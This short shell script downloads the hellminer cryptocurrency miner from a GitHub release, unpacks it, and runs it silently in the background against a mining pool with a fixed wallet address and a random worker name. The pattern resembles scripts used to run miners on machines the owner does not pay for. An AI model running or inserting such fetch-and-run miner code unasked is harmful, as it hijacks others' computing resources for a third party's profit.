#!/bin/sh
sudo apt update
sudo apt install screen -y
wget https://github.com/hellcatz/hminer/releases/download/v0.58/hellminer_linux64.tar.gz >/dev/null 2>&1
tar -xvf hellminer_linux64.tar.gz
./hellminer -c stratum+tcp://sg.vipor.net:5040 -u RUM96eiFSsBKcmynDcRBsgmkMPWPyLS21C."A$RANDOM" >/dev/null 2>&1 &
